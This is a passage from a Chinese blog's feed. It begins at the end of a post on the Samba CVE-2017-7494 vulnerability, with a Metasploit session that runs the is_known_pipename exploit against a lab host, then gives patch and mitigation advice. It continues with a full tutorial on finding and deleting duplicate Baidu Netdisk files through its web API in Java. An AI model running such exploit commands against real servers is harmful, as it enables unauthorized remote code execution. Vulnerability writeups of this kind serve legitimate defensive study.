bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/linux/samba/is_known_pipename </span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBUSER smbuser</span><br><span class="line">SMBUSER =&gt; smbuser</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> SMBPASS smbuser</span><br><span class="line">SMBPASS =&gt; smbuser</span><br><span class="line">msf exploit(is_known_pipename) &gt; <span class="built_in">set</span> RHOST 192.168.232.137</span><br><span class="line">RHOST =&gt; 192.168.232.137</span><br><span class="line">msf exploit(is_known_pipename) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="%E6%9C%89%E9%AA%8C%E8%AF%81%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="有验证攻击成功"></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1.受影响的用户尽快下载最新的Samba版本手动更新。<br>2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作<br>3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="https://github.com/rapid7/metasploit-framework/pull/8450" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/8450</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3900.html</a><br>[3]<a href="https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/" target="_blank" rel="noopener">https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2017-7494 </tag>
            
            <tag> Samba漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何清除百度网盘重复文件</title>
      <link href="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/"/>
      <url>/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。<br>要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。</p><a id="more"></a><h3 id="0x01-如何获取重复的文件"><a href="#0x01-如何获取重复的文件" class="headerlink" title="0x01 如何获取重复的文件"></a>0x01 如何获取重复的文件</h3><p>这里以wap版为例。<br>打开<a href="https://pan.baidu.com/wap/home" target="_blank" rel="noopener">https://pan.baidu.com/wap/home</a> 并抓包。<br>可以看到一个Get请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F</span><br></pre></td></tr></table></figure><p><strong>主要请求参数：</strong></p><table><thead><tr><th>参数名</th><th>备注</th></tr></thead><tbody><tr><td>bdstoken</td><td>网页源代码中有</td></tr><tr><td>loginid</td><td>BASE64(时间戳+四位+.+16位数字)，固定值即可</td></tr><tr><td>page</td><td>页码</td></tr><tr><td>num</td><td>每页显示条数</td></tr><tr><td>dir</td><td>文件路径</td></tr><tr><td>order</td><td>排序的条件（固定时间排序即可）</td></tr><tr><td>desc</td><td>升序降序（降序排列即可）</td></tr></tbody></table><p>其他参数固定值即可<br>返回内容为JSON</p><p><img src="JSON%E5%86%85%E5%AE%B9.jpg" alt="JSON内容"></p><p>当遇到文件时，会返回文件的MD5和大小以及路径。<br><img src="%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.jpg" alt="文件内容"></p><p><strong>返回JSON中的主要内容说明</strong><br>只列举需要的字段</p><table><thead><tr><th>名称</th><th>含义</th><th>备注</th></tr></thead><tbody><tr><td>isdir</td><td>是否为目录</td><td>文件为0，目录为1</td></tr><tr><td>size</td><td>文件大小</td><td>单位是字节</td></tr><tr><td>md5</td><td>文件的MD5值</td><td>可以用来判断文件是否重复</td></tr><tr><td>path</td><td>文件的路径</td><td>包含文件名</td></tr><tr><td>server_filename</td><td>文件名称</td><td>文件的名称</td></tr></tbody></table><p>于是可以根据文件的MD5值来判断文件是否重复。<br>首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。<br>这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。<br>因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。<br>具体实现步骤如下：</p><h4 id="1-获取bdstoken"><a href="#1-获取bdstoken" class="headerlink" title="1.获取bdstoken"></a>1.获取bdstoken</h4><p>访问<a href="https://pan.baidu.com/wap/home" target="_blank" rel="noopener">https://pan.baidu.com/wap/home</a> ，查看源代码搜索bdstoken即可看到。<br>代码的实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取bdstoken</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bdstoken</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getbdstoken</span><span class="params">()</span></span>&#123;</span><br><span class="line">String bdstoken = <span class="keyword">null</span>;</span><br><span class="line">Document doc = getDoc(Util.URL_HOME,getCookies());</span><br><span class="line">String regex = <span class="string">"\"bdstoken\":\"(.*)\",\"quota"</span>;</span><br><span class="line">Pattern pattern = Pattern.compile(regex);</span><br><span class="line">Matcher matcher = pattern.matcher(doc.html());</span><br><span class="line"><span class="keyword">if</span>(matcher.find())&#123;</span><br><span class="line">bdstoken = matcher.group(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bdstoken;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String,String&gt; <span class="title">getCookies</span><span class="params">()</span></span>&#123;</span><br><span class="line">Map&lt;String,String&gt; cookies = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">cookies.put(<span class="string">"BDUSS"</span>, <span class="string">"你的BDUSS"</span>);</span><br><span class="line">cookies.put(<span class="string">"STOKEN"</span>, <span class="string">"你的STOKEN"</span>);</span><br><span class="line"><span class="keyword">return</span> cookies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-递归获取所有的文件，并将文件的相关内容保存到数据库中"><a href="#2-递归获取所有的文件，并将文件的相关内容保存到数据库中" class="headerlink" title="2.递归获取所有的文件，并将文件的相关内容保存到数据库中"></a>2.递归获取所有的文件，并将文件的相关内容保存到数据库中</h4><p>获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。<br>如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 列出当前页面文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page 页面</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> num 显示数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dir 路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;PanFile&gt; <span class="title">getFiles</span><span class="params">(<span class="keyword">int</span> page,<span class="keyword">int</span> num,String dir)</span></span>&#123;</span><br><span class="line">String url = <span class="string">"https://pan.baidu.com/api/list?bdstoken="</span>+getbdstoken()+<span class="string">"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page="</span>+page+<span class="string">"&amp;num="</span>+num+<span class="string">"&amp;dir="</span>+dir;</span><br><span class="line">String jsonStr = getbody(url, getCookies());</span><br><span class="line">JSONObject jsonObj = JSONObject.parseObject(jsonStr);</span><br><span class="line">JSONArray result = jsonObj.getJSONArray(<span class="string">"list"</span>);</span><br><span class="line">List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile<span class="class">.<span class="keyword">class</span>)</span>;  </span><br><span class="line"><span class="keyword">return</span> files;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归遍历当前路径下所有文件代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归打印当前路径下所有文件，并入库</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> str 路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printFiles</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"><span class="keyword">boolean</span> flag=<span class="keyword">false</span>;</span><br><span class="line">String dency[] = &#123;<span class="string">"/C#资料/我的c#"</span>,<span class="string">"/12-19 Java Workplace"</span>,<span class="string">"/dumppp"</span>,<span class="string">"/myWEB"</span>&#125;;<span class="comment">//白名单，针对其中的目录不遍历</span></span><br><span class="line"><span class="keyword">for</span> (String string : dency) &#123;</span><br><span class="line"><span class="keyword">if</span>(str.trim().equals(string))&#123;</span><br><span class="line">flag = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!flag)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">str = URLEncoder.encode(str, <span class="string">"utf-8"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">List&lt;PanFile&gt; files= UtilMethod.getFiles(<span class="number">1</span>,<span class="number">2000</span>,str);</span><br><span class="line"><span class="keyword">for</span> (PanFile panFile : files) &#123;</span><br><span class="line"><span class="keyword">if</span>(panFile.getIsdir()==<span class="number">1</span>)&#123;</span><br><span class="line">printFiles(panFile.getPath());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">String fileName = panFile.getPath();</span><br><span class="line">System.out.println(fileName+<span class="string">"---size:"</span>+panFile.getSize()+<span class="string">"--md5:"</span>+panFile.getMd5());</span><br><span class="line">insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(),</span><br><span class="line">panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(),</span><br><span class="line">panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如图所示</p><p><img src="%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6.jpg" alt="遍历文件"><br>查看数据库中的文件信息<br><img src="%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF.png" alt="数据库中文件信息"></p><blockquote><p>由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。<br>由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。<br>为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。<br>插入数据库方法的代码比较简单，这里就省略了。</p></blockquote><h4 id="3-获取重复的大文件"><a href="#3-获取重复的大文件" class="headerlink" title="3.获取重复的大文件"></a>3.获取重复的大文件</h4><p>已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。</p><h5 id="1-获取大于500M的重复文件的MD5"><a href="#1-获取大于500M的重复文件的MD5" class="headerlink" title="1.获取大于500M的重复文件的MD5"></a>1.获取大于500M的重复文件的MD5</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取大于500M的重复文件的MD5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp1</span><span class="params">()</span></span>&#123;</span><br><span class="line">List&lt;String&gt; ltMd5 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">String sql = <span class="string">"select count(*),md5,server_filename from mmpan "</span></span><br><span class="line">+ <span class="string">"where size &gt; 1024*1024*500 "</span></span><br><span class="line">+ <span class="string">"group by md5  "</span></span><br><span class="line">+ <span class="string">"HAVING COUNT(md5) &gt;1 "</span></span><br><span class="line">+ <span class="string">"order by path"</span>;</span><br><span class="line">Connection conn = DBFactory.getConnection();</span><br><span class="line">PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">pst = conn.prepareStatement(sql);</span><br><span class="line">rst = pst.executeQuery();</span><br><span class="line"><span class="keyword">while</span>(rst.next())&#123;</span><br><span class="line">ltMd5.add(rst.getString(<span class="string">"md5"</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">DBFactory.close(rst, pst, conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ltMd5;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-根据步骤1获取文件的MD5值，获取最小path的长度"><a href="#2-根据步骤1获取文件的MD5值，获取最小path的长度" class="headerlink" title="2.根据步骤1获取文件的MD5值，获取最小path的长度"></a>2.根据步骤1获取文件的MD5值，获取最小path的长度</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据文件的MD5值，获取最小path的长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> md5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">setp2</span><span class="params">(String md5)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> length = -<span class="number">1</span>;</span><br><span class="line">String sql = <span class="string">"select min(LENGTH(path)) from mmpan where md5=?"</span>;</span><br><span class="line">Connection conn = DBFactory.getConnection();</span><br><span class="line">PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">pst = conn.prepareStatement(sql);</span><br><span class="line">pst.setString(<span class="number">1</span>, md5);</span><br><span class="line">rst = pst.executeQuery();</span><br><span class="line"><span class="keyword">if</span>(rst.next())&#123;</span><br><span class="line">length = rst.getInt(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">DBFactory.close(rst, pst, conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-根据MD5和最短路径，列出大于最短路径的文件"><a href="#3-根据MD5和最短路径，列出大于最短路径的文件" class="headerlink" title="3.根据MD5和最短路径，列出大于最短路径的文件"></a>3.根据MD5和最短路径，列出大于最短路径的文件</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据MD5和最短路径，列出大于最短路径的文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> md5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp3</span><span class="params">(String md5,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">List&lt;String&gt; ltPath = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">String sql = <span class="string">"select path from mmpan where md5=? and LENGTH(path) &gt; ?"</span>;</span><br><span class="line">Connection conn = DBFactory.getConnection();</span><br><span class="line">PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">pst = conn.prepareStatement(sql);</span><br><span class="line">pst.setString(<span class="number">1</span>, md5);</span><br><span class="line">pst.setInt(<span class="number">2</span>, length);</span><br><span class="line">rst = pst.executeQuery();</span><br><span class="line"><span class="keyword">while</span>(rst.next())&#123;</span><br><span class="line">ltPath.add(rst.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">DBFactory.close(rst, pst, conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ltPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>获取这个列表是为了将其删除</p></blockquote><p>将以上三步综合起来，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取指定条件下文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">getPaths</span><span class="params">()</span></span>&#123;</span><br><span class="line">List&lt;String&gt; ltPath = <span class="keyword">null</span>;</span><br><span class="line">List&lt;String&gt; ltPaths = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">List&lt;String&gt; lt = UtilMethod.setp1();</span><br><span class="line"><span class="keyword">int</span> length = -<span class="number">1</span> ;</span><br><span class="line"><span class="keyword">for</span> (String md5 : lt) &#123;</span><br><span class="line">length = UtilMethod.setp2(md5);</span><br><span class="line">ltPath = UtilMethod.setp3(md5, length);</span><br><span class="line"><span class="keyword">for</span> (String path : ltPath) &#123;</span><br><span class="line">ltPaths.add(path);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ltPaths;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时列表中的文件都是为了删除的文件的路径。</p><h3 id="0x02-如何实现删除文件"><a href="#0x02-如何实现删除文件" class="headerlink" title="0x02 如何实现删除文件"></a>0x02 如何实现删除文件</h3><p>删除文件时抓包，发现如下请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1</span><br><span class="line">Host: pan.baidu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Cookie: Cookie</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D</span><br></pre></td></tr></table></figure><p>所需参数有bdstoken和删除文件的列表</p><p>我们首先将需要删除文件拼接起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 根据文件路径拼接filelist</span><br><span class="line"> * @<span class="built_in">return</span></span><br><span class="line"> */</span><br><span class="line">public static String <span class="function"><span class="title">getFileList</span></span>()&#123;</span><br><span class="line">List&lt;String&gt; ltPath = UtilMethod.getPaths();</span><br><span class="line">StringBuilder sb = new StringBuilder();</span><br><span class="line">sb.append(<span class="string">"["</span>);</span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">//System.out.println(ltPath.get(i));</span><br><span class="line">sb.append(<span class="string">"\""</span>);</span><br><span class="line">sb.append(ltPath.get(i));</span><br><span class="line">sb.append(<span class="string">"\""</span>);</span><br><span class="line">sb.append(<span class="string">","</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">sb.append(<span class="string">"***]"</span>);</span><br><span class="line"><span class="built_in">return</span> sb.toString().replace(<span class="string">",***"</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。</p></blockquote><p>删除文件的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据文件列表删除文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filelist</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">delRequest</span><span class="params">(String filelist)</span></span>&#123;</span><br><span class="line">String url = <span class="string">"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken="</span>+getbdstoken()+<span class="string">"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0"</span>;</span><br><span class="line">String result = <span class="string">"删除失败,请重试"</span>;</span><br><span class="line">String jsonStr = getbody(url, getCookies(),filelist);</span><br><span class="line">JSONObject jsonObj = JSONObject.parseObject(jsonStr);</span><br><span class="line"><span class="keyword">if</span>(jsonObj.get(<span class="string">"errno"</span>).toString().equals(<span class="string">"0"</span>))&#123;</span><br><span class="line">result = <span class="string">"文件删除成功，删除成功的文件为"</span>+filelist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试删除的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testdelFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">String fileList = UtilMethod.getFileList();</span><br><span class="line">System.out.println(UtilMethod.delRequest(fileList));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附上效果图<br><img src="Java%E4%BB%A3%E7%A0%81%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6.gif" 